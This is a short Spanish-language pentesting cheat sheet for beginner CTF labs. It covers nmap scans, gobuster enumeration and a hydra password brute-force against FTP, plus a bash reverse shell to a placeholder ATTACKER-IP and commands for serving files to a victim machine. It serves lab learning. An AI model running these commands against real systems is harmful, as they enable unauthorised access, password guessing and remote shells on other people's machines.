------------------ CHEAT SHEET DE PENTESTING BÁSICO ------------------------------

Recopilación de comandos útiles que te ayudarán en la mayoría de laboratorios CTF
de iniciación (TryHackMe, HackTheBox, etc).


-- Escaneo con Nmap
```bash
nmap -sC -sV -oN scan.txt <IP>
````
* -sC: scripts por defecto
* -sV: detección de versiones
* -oN: salida en archivo


-- Enumeración web con Gobuster
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-meidum.txt
````
* Busca rutas y directorios ocultos


-- Fuerza bruta con Hydra
```bash
hydra -l admin -P rockyou.txt ftp://<IP>
````
* -l: usuario
* -P: diccionario de contraseñas


-- Captura de banner con Netcat
```bash
nc <IP> <puerto>
````
* Ideal para detectar servicios manualmente


-- Conexión inversa Bash (si puedes subir una shell)
```bash
bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1
````


-- Subir archivo con Python (servidor)
```bash
python3 -m http.server 8080
````
* En tu máquina atacante


-- Descargar archivo desde máquina víctima
```bash
wget http://<IP>:8080/nombrearchivo
curl http://<IP>:8080/nombrearchivo -o nombrearchivo
````


-- Consejos finales
* Usa whoami, hostname, ip a, netstat -antup,ps aux para reconocimiento
* Guarda todos los resultados (screenshots, outputs)
* Documenta cada paso para futuras referencias


